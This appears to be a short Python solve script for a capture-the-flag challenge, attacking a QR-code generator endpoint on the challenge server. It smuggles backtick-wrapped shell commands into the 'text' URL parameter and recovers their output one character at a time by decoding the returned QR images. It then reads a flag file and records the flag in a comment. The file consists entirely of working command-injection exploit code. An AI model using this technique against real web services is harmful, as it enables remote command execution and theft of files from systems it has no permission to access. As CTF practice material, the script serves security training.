import time

from PIL import Image
from pyzbar.pyzbar import decode
from requests import get

URL = "http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text="

timestamp = str(time.time())

def run_cmd(cmd: str, resp_len=10000) -> str:
    print("running command:", cmd)
    ret = ""
    for i in range(resp_len):
        with open(f"tmp_qr_{timestamp}.png", 'wb') as file:
            file.write(get(f"{URL}`{cmd} | head -c {i+1} | tail -c 1`").content)
        dat = decode(Image.open(f"tmp_qr_{timestamp}.png"))
        ret += dat[0].data.decode()
        print(dat[0].data.decode(), end='', flush=True)

        if ret.endswith("\n\n\n\n\n"):  # stop early if the output is finished
            break
    return ret


def main():
    print(run_cmd('cat /home/rtcp/flag.txt'))
    # rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}


if __name__ == "__main__":
    main()
